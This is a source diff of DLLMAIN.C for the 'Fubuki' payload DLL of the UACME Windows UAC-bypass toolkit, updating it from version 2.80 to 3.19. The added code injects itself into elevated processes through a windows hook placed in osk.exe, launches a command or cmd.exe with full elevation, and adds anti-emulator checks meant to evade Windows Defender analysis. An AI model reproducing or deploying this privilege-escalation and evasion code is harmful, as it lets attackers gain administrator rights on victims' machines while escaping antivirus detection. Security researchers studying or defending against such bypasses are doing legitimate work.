@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2017
+*  (C) COPYRIGHT AUTHORS, 2014 - 2019
 *
 *  TITLE:       DLLMAIN.C
 *
-*  VERSION:     2.80
+*  VERSION:     3.19
 *
-*  DATE:        06 Sept 2017
+*  DATE:        09 Apr 2019
 *
 *  Proxy dll entry point, Fubuki Kai Ni.
 *
@@ -17,44 +17,9 @@
 *
 *******************************************************************************/
 
-#if !defined UNICODE
-#error ANSI build is not supported
-#endif
+#include "fubuki.h"
 
-//disable nonmeaningful warnings.
-#pragma warning(disable: 4005) // macro redefinition
-#pragma warning(disable: 4055) // %s : from data pointer %s to function pointer %s
-#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
-#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union
-#pragma warning(disable: 6102) // Using %s from failed function call at line %u
-
-#include <windows.h>
-#include "shared\ntos.h"
-#include <ntstatus.h>
-#include "shared\minirtl.h"
-#include "shared\_filename.h"
-#include "shared\util.h"
-#include "unbcl.h"
-#include "wbemcomn.h"
-
-#if (_MSC_VER >= 1900) 
-#ifdef _DEBUG
-#pragma comment(lib, "vcruntimed.lib")
-#pragma comment(lib, "ucrtd.lib")
-#else
-#pragma comment(lib, "libvcruntime.lib")
-#endif
-#endif
-
-#define LoadedMsg      TEXT("Fubuki lock and loaded")
-
-//default execution flow
-#define AKAGI_FLAG_KILO  1
-
-//suppress all additional output
-#define AKAGI_FLAG_TANGO 2
-
-DWORD g_AkagiFlag;
+UACME_PARAM_BLOCK g_SharedParams;
 
 /*
 * DummyFunc
@@ -75,46 +40,60 @@ VOID WINAPI DummyFunc(
 *
 * Purpose:
 *
-* Process parameter if exist or start cmd.exe and exit immediatelly.
+* Process parameter if exist or start cmd.exe and exit immediately.
 *
 */
 VOID DefaultPayload(
     VOID
 )
 {
-    BOOL bIsLocalSystem = FALSE, bReadSuccess;
-    PWSTR lpParameter = NULL;
-    ULONG cbParameter = 0L;
+    BOOL bSharedParamsReadOk;
+    UINT ExitCode;
+    PWSTR lpParameter;
+    ULONG cbParameter;
 
-    OutputDebugString(LoadedMsg);
+    ucmDbgMsg(LoadedMsg);
 
-    ucmIsLocalSystem(&bIsLocalSystem);
-    g_AkagiFlag = AKAGI_FLAG_KILO;     
+    //
+    // Read shared params block.
+    //
+    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
+    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
+    if (bSharedParamsReadOk) {
+        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters OK\r\n");
 
-    bReadSuccess = ucmReadParameters(
-        &lpParameter,
-        &cbParameter,
-        &g_AkagiFlag,
-        NULL,
-        bIsLocalSystem);
-
-    ucmLaunchPayload(
-        lpParameter,
-        cbParameter);
-
-    if ((lpParameter == NULL) && (cbParameter == 0)) {
-        if (g_AkagiFlag == AKAGI_FLAG_KILO)
-            ucmQueryRuntimeInfo(FALSE);
+        lpParameter = g_SharedParams.szParameter;
+        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
     }
     else {
-        if (bReadSuccess) {
-            RtlFreeHeap(
-                NtCurrentPeb()->ProcessHeap,
-                0,
-                lpParameter);
-        }
+        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters Failed\r\n");
+        lpParameter = NULL;
+        cbParameter = 0UL;
     }
-    ExitProcess(0);
+
+    ucmDbgMsg(L"Fubuki, before ucmLaunchPayload\r\n");
+
+    ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);
+
+    ucmDbgMsg(L"Fubuki, after ucmLaunchPayload\r\n");
+
+    //
+    // If this is default executable, show runtime info.
+    //
+    if ((lpParameter == NULL) || (cbParameter == 0)) {
+        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_KILO)
+            ucmQueryRuntimeInfo(FALSE);
+    }
+
+    //
+    // Notify Akagi.
+    //
+    if (bSharedParamsReadOk) {
+        ucmDbgMsg(L"Fubuki, completion\r\n");
+        ucmSetCompletion(g_SharedParams.szSignalObject);
+    }
+
+    ExitProcess(ExitCode);
 }
 
 /*
@@ -140,20 +119,21 @@ LRESULT CALLBACK UiAccessMethodHookProc(
 * Purpose:
 *
 * Defines application context and either:
-* - installs windows hook for dll injection
+* - if fInstallHook set - installs windows hook for dll injection
 * - run default payload in target app context
 *
 */
 VOID UiAccessMethodPayload(
-    _In_ HINSTANCE hinstDLL
+    _In_ HINSTANCE hinstDLL,
+    _In_ BOOL fInstallHook,
+    _In_opt_ LPWSTR lpTargetApp
 )
 {
     LPWSTR lpFileName;
     HHOOK hHook;
     HOOKPROC HookProcedure;
+    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;
     WCHAR szModuleName[MAX_PATH + 1];
-
-    OutputDebugString(LoadedMsg);
 
     RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
     if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
@@ -162,33 +142,49 @@ VOID UiAccessMethodPayload(
     lpFileName = _filename(szModuleName);
     if (lpFileName == NULL)
         return;
+   
+    if (fInstallHook) {
+
+        //
+        // Check if we are in the required application context
+        // Are we inside osk.exe?
+        //
+        if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
+            HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, FUBUKI_WND_HOOKPROC); //UiAccessMethodHookProc
+            if (HookProcedure) {
+                hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
+                if (hHook) {
+                    //
+                    // Timeout to be enough to spawn target app.
+                    //
+                    Sleep(15000);
+                    UnhookWindowsHookEx(hHook);
+                }
+            }
+            ExitProcess(0);
+        }
+    }
 
     //
-    // Check if we are in the required application context
-    // Are we inside osk.exe?
+    // If target application name specified - check are we inside target app?
     //
-    if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
-        HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, "_FubukiProc2");
-        if (HookProcedure) {
-            hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
-            if (hHook) {
-                //
-                // Timeout to be enough to spawn target app.
-                //
-                Sleep(15000);
-                UnhookWindowsHookEx(hHook);
+    if (lpTargetApp) {
+        if (_strcmpi(lpFileName, lpTargetApp) == 0) {
+            DefaultPayload();
+        }
+    }
+    else {
+        //
+        // Use any suitable elevated context.
+        //
+        if (ucmGetProcessElevationType(NULL, &TokenType)) {
+            if (TokenType == TokenElevationTypeFull) {
+                DefaultPayload();
             }
         }
-        ExitProcess(0);
-    }
-
-    //
-    // Are we inside target app?
-    //
-    if (_strcmpi(lpFileName, TEXT("mmc.exe")) == 0) {
-        DefaultPayload();
     }
 }
+
 
 /*
 * UiAccessMethodDllMain
@@ -207,8 +203,12 @@ BOOL WINAPI UiAccessMethodDllMain(
 {
     UNREFERENCED_PARAMETER(lpvReserved);
 
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+        ExitProcess('foff');
+    }
+
     if (fdwReason == DLL_PROCESS_ATTACH) {
-        UiAccessMethodPayload(hinstDLL);
+        UiAccessMethodPayload(hinstDLL, TRUE, MMC_EXE);
     }
 
     return TRUE;
@@ -231,6 +231,10 @@ BOOL WINAPI DllMain(
     UNREFERENCED_PARAMETER(hinstDLL);
     UNREFERENCED_PARAMETER(lpvReserved);
 
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+        ExitProcess('foff');
+    }
+
     if (fdwReason == DLL_PROCESS_ATTACH) {
         DefaultPayload();
     }
@@ -249,5 +253,35 @@ BOOL WINAPI DllMain(
 VOID WINAPI EntryPoint(
     VOID)
 {
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+        ExitProcess('foff');
+    }
     DefaultPayload();
+}
+
+
+/*
+* EntryPointUIAccessLoader
+*
+* Purpose:
+*
+* Entry point to be used in exe mode.
+*
+*/
+VOID WINAPI EntryPointUIAccessLoader(
+    VOID)
+{
+    ULONG r;
+    WCHAR szParam[MAX_PATH * 2];
+
+    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+        ExitProcess('foff');
+    }
+
+    if (GetCommandLineParam(GetCommandLine(), 0, szParam, MAX_PATH, &r)) {
+        if (r > 0) {
+            ucmUIHackExecute(szParam);
+        }
+    }
+    ExitProcess(0);
 }
